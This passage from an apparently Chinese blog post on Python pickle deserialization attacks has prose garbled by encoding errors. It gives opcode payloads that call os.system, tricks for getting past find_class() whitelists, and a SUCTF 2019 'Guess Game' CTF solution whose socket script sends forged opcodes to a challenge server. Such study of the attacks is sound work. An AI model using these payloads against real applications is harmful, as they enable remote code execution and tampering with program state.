&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># é€šè¿‡b&amp;#39;R&amp;#39;è°ƒç”¨ __reducce__æ–¹æ³•&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">system&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># é€šè¿‡b&amp;#39;i&amp;#39;è°ƒç”¨&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># é€šè¿‡b&amp;#39;c&amp;#39;å’Œb&amp;#39;o&amp;#39;è°ƒç”¨&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># å¤šå‚æ•°è°ƒç”¨å‡½æ•°&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[module]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[callable]&amp;#39;&lt;/span>&lt;span style="color:#111">[,&lt;/span> &lt;span style="color:#111">param0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">param1&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[module]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[callable]&amp;#39;&lt;/span>&lt;span style="color:#111">)[,&lt;/span> &lt;span style="color:#111">param0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">param1&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>å®ä¾‹åŒ–å¯¹è±¡ï¼ˆç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œï¼‰&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">animal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">animal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>å…ˆå¯¹é¢˜ç›®æœ‰å¤§æ¦‚æ€è·¯ï¼Œç„¶åè¾…ä»¥å·¥å…·~å¥½è€¶&lt;/p>
&lt;h3 id="å·¥å…·äºŒè¿---uanapickleuhttpsgithubcomsensepostanapickle">å·¥å…·äºŒè¿ - &lt;a href="https://github.com/sensepost/anapickle">&lt;u>anapickle&lt;/u>&lt;/a>&lt;/h3>
&lt;p>å…¶å®ä¸€ä¸ªå¹´é¾„å¾ˆå¤§çš„è„šæœ¬äº†ï¼Œæ”¯æŒpython2.3ã€‚ã€‚ã€‚ã€‚ä½†æ˜¯åŒ…å«äº†å¾ˆå¤špayloadï¼Œå¯ä»¥çµæ´»è¿ç”¨~&lt;/p>
&lt;h2 id="bypass">bypass!!!&lt;/h2>
&lt;h3 id="å¯¹ç±»å‹çš„æ£€æŸ¥">å¯¹ç±»å‹çš„æ£€æŸ¥&lt;/h3>
&lt;p>å¯ä»¥åœ¨å·²ç»æ„é€ å¥½çš„opcodeåé¢å»æ‰&lt;code>.&lt;/code>å†ç»­ä¸Šç›¸åº”çš„å¯¹è±¡çš„opcodeï¼Œä½œä¸ºæ ˆé¡¶çš„å€¼ä¾›æ£€æŸ¥&lt;/p>
&lt;h3 id="é™åˆ¶bcå¯¹æ¨¡å—çš„å¼•å…¥---find_classçš„é‡å†™">é™åˆ¶&lt;code>b'c'&lt;/code>å¯¹æ¨¡å—çš„å¼•å…¥ - &lt;code>find_class()&lt;/code>çš„é‡å†™&lt;/h3>
&lt;p>ä¿®æ”¹&lt;code>find_class()&lt;/code>ä¼šå¼•å…¥å‡½æ•°&amp;amp;æ¨¡å—çš„ç™½åå•ï¼Œä¸€å®šç¨‹åº¦ä¸Šè§£å†³pickleçš„å®‰å…¨æ€§é—®é¢˜ï¼›ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¼šè°ƒç”¨&lt;code>find_class()&lt;/code>çš„æ£€æŸ¥ï¼š&lt;/p>
&lt;ul>
&lt;li>opcodeè§’åº¦ï¼šå‡ºç°&lt;code>c&lt;/code>, &lt;code>i&lt;/code>, &lt;code>b'\x93'&lt;/code>ä¼šè°ƒç”¨&lt;/li>
&lt;li>pythonè§’åº¦ï¼šfind_class()åªä¼šåœ¨è§£æopcodeæ—¶è°ƒç”¨ä¸€æ¬¡ï¼Œåªè¦ç»•è¿‡opcodeçš„æ‰§è¡Œè¿‡ç¨‹ï¼Œä¹‹åå†äº§ç”Ÿçš„å‡½æ•°åœ¨é»‘åå•ä¸­ä¹Ÿä¸ä¼šæ‹¦æˆªï¼ˆæ¯”å¦‚é€šè¿‡&lt;code>__import__&lt;/code>æ¥ç»•è¿‡ï¼‰&lt;/li>
&lt;/ul>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥__main__å¼€å¤´çš„æ¨¡å—">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥&lt;code>__main__&lt;/code>å¼€å¤´çš„æ¨¡å—&lt;/h3>
&lt;p>â€œé€šè¿‡GLOBALæŒ‡ä»¤å¼•å…¥çš„å˜é‡å¯ä»¥çœ‹ä½œæ˜¯åŸå˜é‡çš„å¼•ç”¨ï¼Œæˆ‘ä»¬åœ¨æ ˆä¸Šä¿®æ”¹å®ƒçš„å€¼ï¼Œä¹Ÿä¼šä¿®æ”¹åŸå˜é‡â€ï¼ŒåŸºäºè¿™ä¸€åŸç†ï¼Œå½“&lt;code>c&lt;/code>æŒ‡ä»¤åªå…è®¸&lt;code>__main__&lt;/code>æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å¼•å…¥&lt;code>__main__.blue&lt;/code>ï¼ˆblueè§é¢˜è¡Œäº‹ ä¸Šä¸‹æ–‡ä¸­ä¼šæå‰å¼•å…¥ï¼‰è¿™ä¸ªmoduleï¼Œå†å°†ä¸€ä¸ªdictå‹å…¥æ ˆï¼Œå†…å®¹æ˜¯&lt;code>{'name': 'rua', 'grade': 'www'}&lt;/code>ï¼›ä¹‹åæ‰§è¡ŒBUILDæŒ‡ä»¤ï¼Œå°†ä¼šæ”¹å†™&lt;code>__main__.blue.name&lt;/code>å’Œ &lt;code>__main__.blue.grade&lt;/code>ï¼Œæ­¤æ—¶å·²ç»æ‰§è¡Œäº†æˆ‘ä»¬æƒ³è¦çš„å˜é‡è¦†ç›–ã€‚ä¹‹åå¼¹æ‰æ ˆé¡¶ï¼Œç°åœ¨ä¸ºç©ºæ ˆï¼Œæ‹¼æ¥ä¸Šæ­£å¸¸çš„Studentå¯¹è±¡åºåˆ—åŒ–åçš„opcodeã€‚æ­¤æ—¶çš„å®Œæ•´opcodeåœ¨è¢«ååºåˆ—åŒ–æ—¶ï¼Œæ ˆé¡¶æ˜¯æ­£å¸¸çš„Studentå¯¹è±¡ï¼Œè€Œè¢«æ‰§è¡Œæ—¶å´ä¼šå…ˆæ‰§è¡Œä¸€éå‰é¢çš„è¿‡ç¨‹ï¼Œé€ æˆå˜é‡è¦†ç›–ã€‚&lt;/p>
&lt;p>æ—¢ç„¶æˆ‘ä»¬å¯ä»¥åšåˆ°é‡å†™å˜é‡çš„å€¼ï¼Œé‚£ä¹Ÿå¯ä»¥å°†è¿™ä¸ªå€¼æ”¹ä¸ºread wrapperçš„è¿”å›å€¼åšåˆ°ä»»æ„æ–‡ä»¶è¯»å–ï¼ˆè¯¦è§åé¢çš„å†…å®¹ï¼‰&lt;/p>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾çš„æ¨¡å—æ¨¡å—åä¸èƒ½æœ‰__ç¬¦">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾çš„æ¨¡å—&amp;amp;æ¨¡å—åä¸èƒ½æœ‰&lt;code>__&lt;/code>ç¬¦&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­2 - [SUCTF 2019]Guess Game
&lt;/h4>
&lt;/summary>
&lt;p>æœ¬åœ°å¤ç°è¿˜æ˜¯å¤±è´¥ï¼Œæ— è§£ï¼Œdockeråœ°å€-&amp;gt;https://github.com/rmb122/suctf2019_guess_game&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809115950444.png" alt="image-20210809115950444">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130400358.png" alt="image-20210809130400358">&lt;/p>
&lt;p>æ˜¯ä¸ªçŒœæ•°æ¸¸æˆï¼Œäº¤äº’é€»è¾‘åœ¨init.py, Game.pyå’ŒTicket.pyä¸­ï¼Œ10ä»¥å†…çš„æ•°å­—éœ€è¦çŒœå¯¹10æ¬¡ï¼ˆå…¨èƒœï¼‰æ‰ä¼šè¿”å›flag&lt;/p>
&lt;p>ç„¶åæ˜¯game_client.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130523878.png" alt="image-20210809130523878">&lt;/p>
&lt;p>æ¥æ”¶æ•°å­—çš„è¾“å…¥ä½œä¸ºå‚æ•°ç”ŸæˆTicketå¯¹è±¡ï¼Œåºåˆ—åŒ–åå‘é€åˆ°serverç«¯&lt;/p>
&lt;p>å†çœ‹game_server.pyï¼Œç”¨äº†é‡å†™äº†çš„&lt;code>find_class()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130933730.png" alt="image-20210809130933730">&lt;/p>
&lt;p>è¿™ä¸ªé™åˆ¶çš„æ„æ€æ˜¯å¯¼å…¥çš„æ¨¡å—åªèƒ½ä»¥guess_nameå¼€å¤´å¹¶ä¸”åå­—é‡Œæ²¡æœ‰&lt;code>__&lt;/code>&lt;/p>
&lt;p>å¤§æ¦‚çœ‹å®Œäº†æµç¨‹ï¼Œæ¥ä¸‹æ¥æ‰¾æ‰¾çªç ´å£â€”â€”åºåˆ—åŒ–æ—¶æ˜¯ç”Ÿæˆä¸€ä¸ªTicketçš„å®ä¾‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132300981.png" alt="image-20210809132300981">&lt;/p>
&lt;p>åˆ¤æ–­è¾“èµ¢åˆ™æ˜¯éœ€è¦Gameè¾…åŠ©&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132437175.png" alt="image-20210809132437175">&lt;/p>
&lt;p>ç»“åˆgame_server.pyçš„åˆ¤æ–­æ¡ä»¶ï¼Œæ‹¿åˆ°flagéœ€è¦&lt;code>self.win_count == max_round == 10&lt;/code>&lt;/p>
&lt;p>é‚£ä¹ˆæ„é€ çš„æ–¹å‘æœ‰äº†â€”â€”ä¿®æ”¹ç›¸å…³å‚æ•°åšåˆ°å˜é‡è¦†ç›–ï¼Œå†ä»¥åºåˆ—åŒ–çš„opcodeå½¢å¼ä¼ è¿‡å»ã€‚æ‰‹å†™opcodeé¢ä¸´çš„é—®é¢˜å°±æ˜¯é‡å†™&lt;code>find_class()&lt;/code>åå¯¹åŠ è½½æŒ‡å®šæ¨¡å—çš„é™åˆ¶ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°&lt;code>__init__.py&lt;/code>ä¸­&lt;code>game = Game()&lt;/code>ï¼Œæ‰€ä»¥ç›´æ¥å¯ä»¥é€šè¿‡&lt;code>guess_game.game&lt;/code>å¼•å…¥&lt;code>Game()&lt;/code>ç±»ï¼Œç„¶åä¿®æ”¹ç±»ä¸­çš„win_countå’Œround_countå°±èƒ½åšåˆ°å˜é‡è¦†ç›–ï¼›ç¬¬äºŒè¦æ³¨æ„å¿…é¡»æ‰‹å†™opcodeï¼Œå¦‚æœæ˜¯å…ˆ&lt;code>from guess_name import game&lt;/code>ï¼Œç„¶åä¿®æ”¹å‚æ•°åå†dumpï¼Œåˆ™æ˜¯åœ¨è¿è¡Œæ—¶é‡æ–°æ–°å»ºä¸€ä¸ªGameå¯¹è±¡ï¼Œå°±ä¸æ˜¯ä»guess_gameè¿™ä¸ªmoduleä¸­è·å–ï¼Œç ´åä¸Šä¸‹æ–‡ï¼›ç¬¬ä¸‰è¦æ³¨æ„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809140423900.png" alt="image-20210809140423900">&lt;/p>
&lt;p>pickleåºåˆ—åŒ–æµæ‰§è¡Œå®Œä¼šæŠŠæ ˆé¡¶çš„å€¼è¿”å›ï¼Œæ‰€ä»¥æ ˆé¡¶éœ€è¦è®¾ä¸ºTicketï¼Œè¿™é‡Œå¯ä»¥dumpsä¸€ä¸ªTicketï¼Œç„¶åæ‹¼åˆ°ä¹‹å‰æ‰‹å†™çš„opcodeä¹‹å&lt;/p>
&lt;p>opcodes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># ä¿®æ”¹win_count = 10å’Œround_count = 9ï¼Œä¼ è¿‡å»ä¹‹åæ‰§è¡Œä¸€æ¬¡round_count += 1å°±èƒ½å…¨èƒœ&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cguess_name&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">game&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#34;win_count&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">I10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">sS&lt;/span>&lt;span style="color:#d88200">&amp;#34;round_count&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">I9&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">sbcguess_game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Ticket&lt;/span>\&lt;span style="color:#111">nTicket&lt;/span>\&lt;span style="color:#111">nq&lt;/span>\&lt;span style="color:#111">x00&lt;/span>&lt;span style="color:#111">)&lt;/span>\&lt;span style="color:#111">x81q&lt;/span>\&lt;span style="color:#111">x01&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>\&lt;span style="color:#111">x02X&lt;/span>\&lt;span style="color:#111">x06&lt;/span>\&lt;span style="color:#111">x00&lt;/span>\&lt;span style="color:#111">x00&lt;/span>\&lt;span style="color:#111">x00numberq&lt;/span>\&lt;span style="color:#111">x03K&lt;/span>\&lt;span style="color:#111">x06sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># cä¹‹åæ˜¯è¢«find_class()ç›‘æ§çš„åŒºåŸŸï¼Œæ‹¼æ¥Ticket&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;node4.buuoj.cn&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">28803&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">exp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;cguess_game
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">game
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">}S&amp;#34;win_count&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">I10
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">sS&amp;#34;round_count&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">I9
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">sbcguess_game.Ticket&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Ticket&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x06\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">numberq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">sb.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;I&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809144613834.png" alt="image-20210809144613834">&lt;/p>
&lt;p>â€”â€”â€”â€”ç”¨pker&lt;/p>
